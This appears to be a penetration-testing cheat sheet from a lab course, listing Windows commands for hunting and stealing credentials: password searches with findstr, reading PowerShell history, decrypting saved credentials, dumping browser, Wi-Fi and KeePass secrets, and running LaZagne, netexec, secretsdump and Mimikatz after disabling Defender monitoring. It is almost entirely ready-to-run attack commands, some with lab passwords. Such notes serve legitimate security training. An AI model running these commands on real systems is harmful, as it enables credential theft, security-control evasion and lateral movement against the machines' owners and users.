
#Credential
#### Credential Hunting

**Application Configuration Files**

- Searching for Files
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

 - Dictionary Files
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

**PowerShell History File**

- Confirming PowerShell History Save Path :
```powershell-session
(Get-PSReadLineOption).HistorySavePath
```

- Reading PowerShell History File
```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

- One-liner command : 
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

**PowerShell Credentials**

- Decrypting PowerShell Credentials:

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

#### Other Files

- Tools :  https://github.com/SnaffCon/Snaffler

-  Search File Contents for String - Example 1:
```cmd
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

-  Search File Contents for String - Example 2:
```cmd
findstr /si password *.xml *.ini *.txt *.config 
findstr /si $password *.bat *.ps1
findstr /si $user *.bat *.ps1
```

-  Search File Contents for String - Example 3:
```cmd
findstr /spin "password" *.*
```

- Search File Contents with PowerShell:
```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

- Search for File Extensions - Example 1
```cmd
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

- Search for File Extensions - Example 2
```cmd
 where /R C:\ *.config
```

- Search for File Extensions Using PowerShell
```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

- Download PSSqlite:
```sh
wget https://github.com/RamblingCookieMonster/PSSQLite
```

- Viewing Sticky Notes Data :
```powershell
Set-ExecutionPolicy Bypass -Scope Process

cd .\PSSQLite\
Import-Module .\PSSQLite.psd1

$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

- Other Interesting Files :
```sh
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

#### More Credential Theft

**Cmdkey Saved Credentials**

- Listing Saved Credentials
```cmd
cmdkey /list
```

- Run Commands as Another User
```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

**Browser Credentials**

- Download SharpChrome : 
```sh
wget https://github.com/GhostPack/SharpDPAPI

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpDPAPI.exe

./sharp.exe machinetriage /showall
```

- Retrieving Saved Credentials from Chrome :
```powershell
.\SharpChrome.exe logins /unprotect
```

**Password Managers**

If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password. If we can download a `.kdbx` file to our attacking host, we can use a tool such as keepass2john to extract the password hash

- Find kdbx file :
```sh
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction
SilentlyContinue
```
- Extracting KeePass Hash
```sh
python keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```

**Email**

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool MailSniper .
- Tool : 
https://github.com/dafthack/MailSniper

 **Tools**

- Download LaZagne:
 ```sh
wget  https://github.com/AlessandroZ/LaZagne
 ```
 
- Run LaZagne : 

```powershell
.\lazagne.exe all
```

**OR**

- Download SessionGopher :
```sh 
wget https://github.com/Arvanaghi/SessionGopher
 ```

- Use SessionGopher :
```powershell-session
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

**Or:**

- Seatbelt 
https://github.com/GhostPack/Seatbelt
```shell
Seatbelt.exe -group=all -full
```

**Windows AutoLogon**

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Enumerating Sessions **

```powershell-session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

**Wifi Passwords**

- Viewing Saved Wireless Networks
```cmd
netsh wlan show profile
```

- Retrieving Saved Wireless Passwords
```cmd
netsh wlan show profile ilfreight_corp key=clear
```

**Netexec:**
```sh
netexec smb 10.10.212.150 -u "Administrator" -p "H447.++h6g5}xi" --dpapi --local-auth
nxc smb 10.10.202.39 --use-kcache -lsa --sam --dpapi
nxc smb 192.168.250.170-172 -u 'joker' -p '<3batman0893' -M gpp_password
```

**Impacket :**
```sh
secretsdump 'ms01/administrator:H447.++h6g5}xi@10.10.234.54'
```

**Mimikatz:**

- Use Mimikatz:
```cmd
Set-MpPreference -DisableRealtimeMonitoring $true

.\mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Laps:**

```powershell
net user <current-username>
# Global Group memberships  *LAPS_Readers
netexec smb 10.10.211.230 -u abbie.smith -p "CMe1x+nlRaaWEw" --laps
```

-  **Laps v2 :** 
```powershell
Get-LAPSADPassword  -Identity srv
Get-LapsADPassword -Identity srv -DomainController dc -AsPlainText
```